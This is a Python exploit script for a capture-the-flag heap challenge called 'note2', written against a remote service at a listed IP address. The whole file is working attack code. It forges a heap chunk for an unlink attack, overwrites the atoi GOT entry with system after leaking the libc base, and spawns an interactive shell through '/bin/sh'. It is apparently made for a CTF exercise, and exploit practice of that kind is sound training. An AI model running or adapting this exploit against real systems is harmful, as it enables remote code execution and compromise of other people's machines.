#!/usr/bin/env python
# coding:utf-8

from ctf import *

note_list_addr = 0x0000000000602120
elf = ELF('./note2_a0919769610e7fccb2f8c85077812e5a')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.19.so_3f6aaa980b58f7c7590dee12d731e099')

# io = debug('./note2_a0919769610e7fccb2f8c85077812e5a')
# io.send('''
# # b *0x0000000000400F1C
# ''')
# io.r()
# io = process('./note2_a0919769610e7fccb2f8c85077812e5a')
io = remote('115.28.27.103', 9002)

def new_note(content, length=None):
    io.sendline(1)
    if length is None:
        io.sendline(len(content) + 1)
    else:
        io.sendline(length)
    io.sendline(content)

def show_note(note_id):
    io.sendline(2)
    io.sendline(note_id)

def overwrite_note(note_id, content):
    io.sendline(3)
    io.sendline(note_id)
    io.sendline(1)
    io.sendline(content)

def append_note(note_id, content):
    io.sendline(3)
    io.sendline(note_id)
    io.sendline(2)
    io.sendline(content)

def delete_note(note_id):
    io.sendline(4)
    io.sendline(note_id)

io.sendlines(['', ''])
new_note('', 0)
new_note('A')
new_note(cyclic(0x7f))
delete_note(0)

note3_addr = note_list_addr + 0x18
payload = p64(0) + p64(0x21)
payload += p64(note3_addr - 0x18) + p64(note3_addr - 0x10)
payload += cyclic(0x10)
payload += p64(0x30) + p64(0x90)
new_note(payload, 0)
delete_note(2)

overwrite_note(3, p64(elf.got['atoi']))
io.clean()
show_note(0)
io.recvuntil('Content is ')
atoi_addr = unpack(io.recvline(keepends=False), 'all')
log.info('atoi address: %#x', atoi_addr)
libc_base = atoi_addr - libc.symbols['atoi']
system_addr = libc_base + libc.symbols['system']
log.info('system address: %#x', system_addr)

overwrite_note(0, p64(system_addr))
io.sendline('/bin/sh')

# io.interrupt()
# io.send('''
# x/4xg 0x0000000000602120
# x/4xg 0x0000000000602140
# x/xg 0x0000000000602160
# x/40xg 0x0000000000603000
# ''')

io.interactive()
